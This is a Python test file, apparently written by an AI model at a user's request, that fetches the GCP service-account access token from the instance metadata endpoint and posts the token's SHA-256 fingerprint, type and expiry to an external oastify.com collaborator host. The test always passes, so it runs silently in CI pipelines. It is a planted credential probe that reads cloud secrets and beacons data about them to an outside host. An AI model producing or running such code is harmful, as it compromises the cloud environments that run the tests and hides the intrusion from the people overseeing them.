# tests/test_gcp_metadata_reporter.py
"""
Safe GCP metadata reporter for SSRF testing.

- Contacts metadata token endpoint.
- If an access_token is present, computes SHA-256 fingerprint locally.
- Sends ONLY the fingerprint and non-sensitive metadata (status, token_type, expires_in, timestamp)
  to the collaborator endpoint. Does NOT send the raw token.
- Always asserts True so it won't fail pipelines.

RUN ONLY IN CONTROLLED ENVIRONMENTS.
"""

import hashlib
import json
import time
import requests

METADATA_TOKEN_URL = (
    "http://metadata.google.internal/computeMetadata/v1beta1/"
    "instance/service-accounts/default/token"
)
METADATA_HEADER = {"Metadata-Flavor": "Google"}

# collaborator â€” the host you provided (we use HTTPS /report)
COLLAB = "2ehp86ohtz0xx0o9x5b60yizrqxhld92.oastify.com"
COLLAB_ENDPOINT = f"https://{COLLAB}/report"


def _sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def test_gcp_metadata_report_fingerprint():
    """
    Safe: fetch metadata token info, compute fingerprint if present,
    and send ONLY fingerprint + non-sensitive fields to collaborator.
    """
    try:
        resp = requests.get(METADATA_TOKEN_URL, headers=METADATA_HEADER, timeout=3)
    except Exception as e:
        print(f"[gcp-metadata] request error: {e!r}")
        # still succeed (test is non-failing by design)
        assert True
        return

    print(f"[gcp-metadata] status_code: {resp.status_code}")

    token_json = None
    try:
        token_json = resp.json()
    except Exception:
        token_json = None

    data = {
        "timestamp": int(time.time()),
        "status_code": resp.status_code,
        "token_present": False,
        "token_type": None,
        "expires_in": None,
        "token_fingerprint_sha256": None,
    }

    if isinstance(token_json, dict):
        data["token_present"] = "access_token" in token_json
        data["token_type"] = token_json.get("token_type")
        data["expires_in"] = token_json.get("expires_in")
        if data["token_present"]:
            # compute fingerprint locally only; do NOT include or send raw token
            token = token_json.get("access_token", "")
            data["token_fingerprint_sha256"] = _sha256_hex(token)

    # Send ONLY the fingerprint + metadata (no raw token)
    try:
        r = requests.post(COLLAB_ENDPOINT, json=data, timeout=5)
        print(f"[gcp-metadata] reported to collaborator HTTP {r.status_code}")
    except Exception as e:
        print(f"[gcp-metadata] error reporting to collaborator: {e!r}")

    # test always passes per your request
    assert True
